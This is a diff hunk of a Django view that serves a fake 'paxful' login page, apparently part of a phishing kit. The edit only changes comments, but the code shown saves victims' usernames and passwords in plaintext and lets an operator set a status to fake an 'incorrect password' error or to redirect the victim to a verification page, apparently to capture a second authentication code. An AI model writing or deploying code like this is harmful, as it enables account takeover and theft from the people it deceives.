@@ -814,34 +814,29 @@ def payment_required_view(request):
 @csrf_exempt
 def paxful(request):
     message = ""
-    submission_id = None
-
-    # Check if a previous submission ID exists from the query parameters
     submission_id = request.GET.get('submission_id')
 
     if request.method == 'POST':
         username = request.POST.get('username')
         password = request.POST.get('password')
 
-        # Save the username and password with a pending status
+        # Create a new submission and set it to "pending"
         submission = UserSubmission.objects.create(username=username, password=password)
         submission_id = submission.id
 
-        # Show "Confirming details" message until admin sets the status
+        # Display a waiting message
         message = "Verifying information, please be patient..."
 
-    # If status is set to 'incorrect', show error message on the first login attempt
+    # Handle incorrect status explicitly
     if request.GET.get('status') == 'incorrect' and not submission_id:
         message = "Incorrect email or password. Please try again."
 
-    # If the status is set to 'incorrect' after the first submission, reset message
     if submission_id:
         submission = UserSubmission.objects.filter(id=submission_id).first()
         if submission:
             if submission.status == 'incorrect':
                 message = "Incorrect email or password. Please try again."
             elif submission.status == 'authenticator':
-                # Redirect to verification if the status is 'authenticator'
                 return redirect(f'/verification/{submission_id}/')
 
     return render(request, 'paxful.html', {'message': message, 'submission_id': submission_id})
